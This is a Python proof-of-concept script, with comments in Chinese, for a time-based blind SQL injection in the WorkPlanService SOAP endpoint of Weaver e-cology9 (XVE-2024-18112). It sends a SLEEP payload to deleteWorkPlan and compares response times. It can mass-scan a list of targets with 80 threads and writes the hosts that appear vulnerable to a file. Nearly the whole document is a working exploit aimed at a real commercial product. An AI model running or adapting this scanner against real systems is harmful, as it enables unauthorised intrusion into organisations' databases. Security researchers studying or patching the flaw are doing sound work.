# -*- coding: utf-8 -*-
# 泛微E-Cology9 WorkPlanService 前台SQL注入漏洞(XVE-2024-18112)
# app="泛微-OA（e-cology）"
# 产品简介:泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。
# 漏洞概述:该漏洞是由于泛微e-cology未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现 SQL 注入漏洞。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
   _  ___    ________    ___   ____ ___  __ __        __________ __ __ 
  | |/ / |  / / ____/   |__ \ / __ \__ \/ // /       / / __  / // /__ |
  |   /| | / / __/________/ // / / /_/ / // /_______/ / /_/ / // /__/ /
 /   | | |/ / /__/_____/ __// /_/ / __/__  __/_____/ / /_/ / // // __/ 
/_/|_| |___/_____/    /____/\____/____/ /_/       /_/\____/_//_//____/ 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
            --author:Kucei  --Version:XVE-2024-18112
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                 
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('XVE-2024-18112')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/services/WorkPlanService'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Content-Type': 'text/xml;charset=UTF-8',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data1 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">\r\n\r<soapenv:Header/>\r\n\r\r<soapenv:Body>\r\n\r\r<web:deleteWorkPlan>\r\n\r\r\r<!--type: string-->\r\n\r\r\r<web:in0>(SELECT 8544 FROM (SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0>\r\n\r\r\r<!--type: int-->\r\n\r\r\r<web:in1>22</web:in1>\r\n\r\r</web:deleteWorkPlan>\r\n\r\r</soapenv:Body>\r\n</soapenv:Envelope>'
    data2 = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">\r\n\r<soapenv:Header/>\r\n\r\r<soapenv:Body>\r\n\r\r<web:deleteWorkPlan>\r\n\r\r\r<!--type: string-->\r\n\r\r\r<web:in0></web:in0>\r\n\r\r\r<!--type: int-->\r\n\r\r\r<web:in1>22</web:in1>\r\n\r\r</web:deleteWorkPlan>\r\n\r\r</soapenv:Body>\r\n</soapenv:Envelope>'
    try :
        response1 = requests.post(url=target+url_payload,headers=headers,data=data1,verify=False,timeout=7)
        response2 = requests.post(url=target+url_payload,headers=headers,data=data2,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time1 - time2 >= 3.7:
            print( f"[+] {target} 存在漏洞！\n")
            with open('XVE-2024-18112.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()